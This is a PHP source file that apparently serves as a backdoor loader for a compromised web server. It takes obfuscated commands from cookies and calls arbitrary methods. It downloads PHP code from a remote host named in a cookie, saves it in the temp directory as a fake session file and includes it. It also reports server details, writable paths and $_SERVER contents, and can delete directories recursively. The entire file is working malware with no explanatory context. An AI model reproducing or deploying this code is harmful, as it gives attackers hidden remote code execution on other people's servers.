<?php
class mbd_core 
{
    public $file;
    public $server;
    public $data;
    public $phpv;
    public $dir;
    public $tmp;
    public $root;
    public $test;
    public $gtype;
    public $secure;
    public $core;
    public $_o;
    public $_p;
    public function __construct($file, $server)
    {
        if(!isset($_COOKIE[1])) return $this->out(1);
        $data = json_decode(base64_decode(str_rot13($_COOKIE[1])));
        if(!$data) return $this->out(2);
        $this->file = preg_replace('|\((.*)$|', '', $file);
        $this->server = $server;
        $this->data = $data;
        $this->phpv = substr(phpversion(), 0, 3);
        $this->dir = dirname($this->file);
        $this->tmp = dirname(__FILE__);
        $this->root = isset($data->root) ? $data->root : $this->server['DOCUMENT_ROOT'];
        $this->test = isset($data->test);
        $this->secure = isset($data->secure) ? $data->secure : FALSE; 
        $this->gtype = 0;
        if(isset($data->method)) 
        {
            $method = $data->method;
            $this->$method();
        }
        if(isset($data->class))
        {
            $class = $this->load(isset($data->class->name)?$data->class->name:$data->class);
            if(isset($data->class->method)) 
            {
                $method = $data->class->method;
                $class->$method();
            }
        }
        return $this->out();
    }
    function link($path, $home=FALSE)
    {
        if(!$home) $home = $this->root;
        if(isset($this->server['HTTP_X_FORWARDED_PROTO'])) $url = $this->server['HTTP_X_FORWARDED_PROTO'];
        elseif(isset($this->server['REQUEST_SCHEME'])) $url = $this->server['REQUEST_SCHEME'];
        else $url = 'http';
        $url .= '://'.$this->server['HTTP_HOST'];
        $re = '|^'.preg_quote($home).'|i';
        if(!preg_match($re, $path)) return $path;
        $path = preg_replace($re, '', $path);
        $path = str_replace(DIRECTORY_SEPARATOR, '/', $path);
        if(!preg_match('|^/|', $path)) $path = '/'.$path;
        return $url.$path;
    }
    function curl($url)
    {
        if(!function_exists('curl_init')) return FALSE;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
        curl_setopt($ch, CURLOPT_AUTOREFERER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36");
        $result = @curl_exec($ch);
        curl_close($ch);
        return $result;
    }
    function info()
    {
        $index = FALSE;
        foreach(array('php','phtml','html','htm','cgi') AS $ext)
        {
            $index = $this->root.'/index.'.$ext;
            if(is_file($index)) break;
        }
        $url = 'https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js';
        $fgc = @file_get_contents($url);
        $fgc = ($fgc && strpos($fgc, 'jquery')!==FALSE);
        $curl = $this->curl($url);
        $curl = ($curl && strpos($curl, 'jquery')!==FALSE);
        $this->data->result = array(
            'tmp' => dirname(__FILE__),
            'root' => $this->root,
            'dir' => $this->dir,
            'php' => phpversion(),
            'os' => php_uname(),
            'wroot' => is_writable($this->root),
            'wdir' => is_writable($this->dir),
            'windex' => ($index && is_file($index) && is_writable($index)),
            'sapi' => php_sapi_name(),
            'ext' => $ext,
            'perms' => substr(sprintf('%o', @fileperms($this->file)), -4),
            'file' => $this->file,
            'hdd' => disk_total_space('/'),
            'fgc' => $fgc,
            'curl' => $curl,
            'server' => $_SERVER
        );
    }
    function rmdir($dir, $clean=0) 
    {
        if ($objs = glob($dir.'/*')) {
            foreach ($objs as $obj) {
                is_dir($obj) ? $this->rmdir($obj) : @unlink($obj);
            }
        }
        return $clean ? (count(glob($dir.'/*'))==0) : @rmdir($dir);
    }
    function get_files($dir = '.', $onlydir=FALSE){
         $files = array();  
         if ($handle = opendir($dir)) {     
              while (false !== ($item = readdir($handle))) {
                  $f = $dir.'/'.$item;
                   if(!$onlydir&&is_file($f)) {
                        $files[] = $f;
                   }elseif(is_dir($f) && ($item != '.') && ($item != '..')){
                       if($onlydir) $files[] = $f;
                       $files = array_merge($files, $this->get_files($f, $onlydir));
                   }
              } 
              closedir($handle);
         }  
         return $files; 
    }
    function scan_dir($dir) {
        if(function_exists('scandir')) {
            return scandir($dir);
        } else {
            $dh  = opendir($dir);
            while (false !== ($filename = readdir($dh)))
                $files[] = $filename;
            return $files;
        }
    }
    function load($name, $return=FALSE, $save=TRUE)
    {
        $class = 'mbd_'.$name;
        $file = $this->tmp.'/sess_'.md5($class).$name;
        $data = FALSE;
        if(!is_file($file) || $this->test)
        {
            $url = base64_decode(str_rot13($_COOKIE[0])).$this->data->key.'-'.$this->phpv.'-'.$name;
            $data = $this->get($url);
            if(empty($data) && !$return) return $this->out('not load');
            if(strpos($data, '[@error@]')!==FALSE) return $this->out(substr($data, 0, 50));
            if($this->secure && !empty($data) && !in_array(md5($data), $this->secure)) return $this->out('providekeyfor '.$name);
            if($save) $this->file_put($file, $data);
        }
        if($return==='filename') return $file;
        if($return) return $data ? $data : $this->file_get($file);
        if(!class_exists($class)) include($file);
        if(!class_exists($class) && unlink($file)) return $this->out('not load class '.$class); 
        return new $class($this);
    }
    function rand($length = 10, $chars='qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890') {
        $l = strlen($chars);
        $r = '';
        for ($i = 0; $i < $length; $i++) {
            $r .= $chars[rand(0, $l - 1)];
        }
        return $r;
    }
    function out($e=0)
    {
        if($e) 
        {
            if(empty($this->data)) $this->data = new stdClass;
            $this->data->error = $e;
        }
        $data = json_encode($this->data);
        if(empty($data)) $data = $this->load('conv')->get();
        echo '[@]'.$data.'[@]';
        exit;
    }
    function get2($g, $p)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $g);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        if($p)
        {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $p);
        }
        $d = curl_exec($ch);
        curl_close ($ch);
        if($d)
        {
            $this->gtype = 2;
            return $d;
        }
        return FALSE;
    }
    function get($u, $p=0)
    {
        if($this->gtype>1)
        {
            $f = 'get'.$this->gtype;
            return $this->$f($u, $p);
        }
        $g = parse_url($u);
        $d = '';
        $s = ($g['scheme']=='https');
        $h = ($p?'POST':'GET')." ".$g['path'];
        if(isset($g['query'])) $h .= '?'.$g['query'];
        $h .= " HTTP/1.0\r\n";
        $h .= "Host: ".$g['host']."\r\n";
        if($p)
        {
            $h .= "Content-Type: application/x-www-form-urlencoded\r\n";
            $h .= "Content-Length: ".strlen($p)."\r\n\r\n".$p."\r\n\r\n";
        }else $h .= "Connection: Close\r\n\r\n";
        $fp = fsockopen(($s?'ssl://':'').$g['host'], $s?443:80);
        if($fp) {
            @fputs($fp, $h);
            $r = 0;
            while(!feof($fp))
            {
                $b = fgets($fp, 1024);
                if($r) $d .= $b;
                if($b == "\r\n") $r = 1;
            }
            @fclose($fp);
            if(!$this->gtype) $this->gtype = 1;
            return $d;
        }
        if(!$this->gtype) return $this->get2($u, $p);
        return FALSE;
    }
    function file_get($file)
    {
        $fp = @fopen($file, 'rb');
        if(!$fp) return file_get_contents($file); 
        $length = @filesize($file);
        if(!$length) return ''; 
        $data = @fread($fp, $length);
        @fclose($fp);
        return $data;
    }
    function file_put($file, $data)
    {
        $test = @file_put_contents($file, $data);
        if($test!==FALSE) return $test;
        $fp = fopen($file, 'w');
        $test = fwrite($fp, $data);
        fclose($fp);
        return $test;
    }
    function copy($from, $to)
    {
        if(is_dir($from))
        {
            $dir = opendir($from); 
            if(!is_dir($to)) mkdir($to); 
            while(false !== ( $f = readdir($dir)) ) { 
                if($f!='.' && $f!='..') $this->copy($from.'/'.$f, $to.'/'.$f);
            } 
            closedir($dir);
            return TRUE;
        }else return copy($from, $to);
    }
    function bd($in)
    {
        $s = false;
        $inl = strlen($in);
        $in = unpack('C*', $in);
        $p = 0;
        $inli = 1;
        $i = 0;
        $j = 0;
        $bp = '=';
        $out = array();
        $b = array(
            -2, -2, -2, -2, -2, -2, -2, -2, -2, -1, -1, -2, -2, -1, -2, -2,
            -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2,
            -1, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, 62, -2, -2, -2, 63,
            52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -2, -2, -2, -2, -2, -2,
            -2,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
            15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -2, -2, -2, -2, -2,
            -2, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
            41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -2, -2, -2, -2, -2,
            -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2,
            -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2,
            -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2,
            -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2,
            -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2,
            -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2,
            -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2,
            -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2, -2
        );
        while ($inl-- > 0) {
            $ch = $in[$inli++];
            if ($ch == $bp) {
                $p++;
                continue;
            }
            $ch = $b[$ch];
            if (!$s) {
                if($ch < 0) continue;
            } else {
                if($ch == -1) continue;
                if($ch == -2 || $p) return false;
            }
            switch ($i % 4) {
                case 0:
                $out[$j] = $ch << 2;
                break;
                case 1:
                $out[$j++] |= $ch >> 4;
                $out[$j] = ($ch & 0x0f) << 4;
                break;
                case 2:
                $out[$j++] |= $ch >>2;
                $out[$j] = ($ch & 0x03) << 6;
                break;
                case 3:
                $out[$j++] |= $ch;
                break;
            }
            $i++;
        }
        if ($s && $i % 4 == 1) return false;
        if ($s && $p && ($p > 2 || ($i + $p) % 4 != 0)) return false;
        unset($out[$j]);
        return implode(array_map('chr', $out));
    }
}
?>
